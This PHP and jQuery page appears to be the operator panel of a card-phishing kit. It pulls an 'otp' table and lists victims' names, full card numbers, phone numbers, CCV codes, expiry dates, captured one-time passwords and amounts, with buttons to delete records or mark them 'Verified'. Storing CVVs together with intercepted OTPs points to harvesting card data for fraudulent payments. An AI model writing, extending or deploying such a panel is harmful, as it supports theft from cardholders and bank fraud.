<?php 


// echo "card";
?>
<br>
<!-- title -->
<div class="alert alert-primary" role="alert">
 <label class="text-center"> ALL CARDS</label>
</div>

<!-- body -->

<div class="alert alert-light" role="alert">
<div class="input-group mb-3">
  <input type="searck" class="form-control" placeholder="search here..." aria-label="Searching box" aria-describedby="basic-addon2">
  <span class="input-group-text" id="basic-addon2"><span class="ai-search"></span> Search</span>
</div>

<!-- table -->
<table class="table table-info">
  <thead>
    <tr>
      <th scope="col">#</th>
      <th scope="col">Firstname</th>
      <th scope="col">Lastname</th>
      <th scope="col">Card Number</th>
       <th scope="col">Phone number</th>
      <th scope="col">CCV</th>
      <th scope="col">Expired Date</th>
      <th scope="col">Otp</th>
      <th scope="col">Amount</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
      <?php 
      $conn=DataBase::getConn();
     $q="SELECT * FROM `otp`";
     $stm=$conn->query($q);
     for ($i=0; $i <$stm->rowCount() ; $i++) { 
        $data=$stm->fetch();
    


      
      ?> 
    <tr>
      <th scope="row"><?php echo $i; ?></th>
      <td><?php echo $data->fname; ?></td>
      <td><?php echo $data->lname; ?></td>
      <td><?php echo $data->cardnumber; ?></td>
      <td><?php echo $data->phone; ?></td>
      <td><?php echo $data->ccv; ?></td>
      <td><?php echo $data->expiredAt; ?></td>
      <td><?php echo $data->otp; ?></td>
      <td><?php echo $data->amt; ?></td>
      <td>
      <button id="<?php echo $data->otpid; ?>" type="button" class="btn btn-danger del">Del</button>
       <button id="<?php echo $data->otpid; ?>" type="button" class="btn btn-danger vry">Verified</button>
      </td>
    </tr>
   <?php  }?>
  </tbody>
</table>
</div>
<script>
    $(document).ready(function () {
        
         $(".vry").click(function (e) { 
            // e.preventDefault();
            var id=$(this).attr("id");
           $.ajax({
               type: "post",
               url: "config/request.php",
               data: {
                VerifieCard:true,
                   id:id
               },
               dataType: "text",
               success: function (response) {
                   alert(response);
                   window.location.reload();
               }
           });
            
        });
        
        $(".del").click(function (e) { 
            // e.preventDefault();
            var id=$(this).attr("id");
           $.ajax({
               type: "post",
               url: "config/request.php",
               data: {
                deleteOtp:true,
                   id:id
               },
               dataType: "text",
               success: function (response) {
                   alert(response);
                   window.location.reload();
               }
           });
            
        });
    });
</script>